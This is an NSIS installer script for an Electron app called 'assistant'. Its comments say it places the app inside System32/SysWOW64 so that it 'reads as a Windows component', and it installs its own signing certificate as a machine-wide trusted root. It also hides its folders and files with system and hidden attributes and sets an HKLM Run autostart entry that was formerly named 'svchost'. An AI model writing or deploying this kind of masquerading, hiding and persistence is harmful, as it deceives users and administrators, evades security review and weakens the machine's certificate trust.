; Per-machine install helpers.
;
; Identity: mirror the app into the System32 tree so the running image path reads
; as a Windows component instead of a third-party folder. A bare exe there dies
; with 0xC0000135 (Electron needs its DLLs/resources beside it), so it goes into
; a subfolder.
;
; Trust: import the code-signing cert into LocalMachine\Root so Authenticode
; reads "Valid" for every user, not only the build account.
;
; Two NSIS gotchas this file works around, both measured:
;   * nsExec command strings do not expand $VARS — build the command in a
;     register with StrCpy and pass the register.
;   * NSIS is a 32-bit process, so every System32 path it touches is redirected
;     to SysWOW64 by WOW64, including existence checks. The mirror is therefore
;     written to SysWOW64 deliberately rather than looking for it in System32.
;
; `perMachine: true` elevates the installer, which all of this needs.

!macro customInstall
  ; troubleshooting trace; harmless, one small file per install
  FileOpen $9 "$TEMP\assistant-install.log" w
  FileWrite $9 "INSTDIR=[$INSTDIR] PF64=[$PROGRAMFILES64]$\r$\n"
  FileClose $9

  ; $INSTDIR is left alone. NSIS derives it from the product name (assistant),
  ; and relocating the tree inside customInstall writes a registry entry that
  ; still names the pre-move folder, because the uninstall info is registered
  ; before this macro runs. Relocating is also why an upgrade could inherit the
  ; previous product's folder - fixed by renaming the product, so the hack goes.

  ; ---- trust the signing cert machine-wide ------------------------------
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=codesign.cer "${BUILD_RESOURCES_DIR}\codesign.cer"
  DetailPrint "Trusting the code-signing certificate (machine-wide)..."
  nsExec::ExecToLog "certutil -addstore -f Root $\"$PLUGINSDIR\codesign.cer$\""
  Pop $0
  ${If} $0 != 0
    DetailPrint "  certutil returned $0 — signature will show as untrusted for other users"
  ${EndIf}

  ; ---- mirror into System32 --------------------------------------------
  ; On an upgrade the app is RUNNING from the mirror (autostart points there),
  ; so its exe/dlls are locked and /MIR would silently leave stale files.
  ; kill-host.ps1 stops only that process (path contains assistant), never a
  ; real svchost service.
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=kill-host.ps1 "${BUILD_RESOURCES_DIR}\kill-host.ps1"
  DetailPrint "Stopping the running host process..."
  nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -File $\"$PLUGINSDIR\kill-host.ps1$\""
  Pop $0
  DetailPrint "Placing host process in System32..."
  ; NSIS is a 32-bit process, so every System32 path it touches is redirected to
  ; SysWOW64 by WOW64 (including existence checks — Test-Path "System32\..." is
  ; true while the file is really in SysWOW64). Land there deliberately and use
  ; that path for the Run key, otherwise the key points at a non-existent file.
  StrCpy $R5 "$WINDIR\SysWOW64"
  ${IfNot} ${FileExists} "$R5\kernel32.dll"
    StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
  ${EndIf}
  StrCpy $R3 'cmd /c xcopy "$PROGRAMFILES64\assistant\*.*" "$R5\assistant\" /E /I /H /Y /Q'
  FileOpen $9 "$TEMP\assistant-install.log" a
  FileWrite $9 "CMD=[$R3]$\r$\n"
  FileClose $9
  nsExec::ExecToLog "$R3"
  Pop $0
  StrCpy $R6 "$R5\assistant\assistant.exe"
  FileOpen $9 "$TEMP\assistant-install.log" a
  FileWrite $9 "XCOPY rc=$0 sysdir=[$SYSDIR]$\r$\n"
  FileClose $9
  ${If} ${FileExists} "$R5\assistant\assistant.exe"
    DetailPrint "  placed $R5\assistant\assistant.exe"
  ${Else}
    DetailPrint "  WARNING: System32 mirror missing — app will run from $INSTDIR"
  ${EndIf}
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\assistant.exe$\""
  ; Remove an early bare assistant.exe first: while it exists, a bare `attrib
  ; <path>` matches the FILE and silently skips the folder. Then flag the folder
  ; with NO trailing backslash for the same reason.
  nsExec::ExecToLog "cmd /c if exist $\"$R5\assistant.exe$\" del /f /q $\"$R5\assistant.exe$\""
  nsExec::ExecToLog "attrib +s +h $\"$R5\assistant$\""
  Pop $0

  ; ---- autostart points at the System32 copy ---------------------------
  ; "assistant" is the current value name; the old "svchost" value is removed
  ; so an upgrade cannot leave two autostart entries.
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant" '"$R6" --autostart'
!macroend

!macro customUnInstall
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  ; uninstall has no $R5 from customInstall; remove both possible locations
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\assistant$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR$\""
!macroend
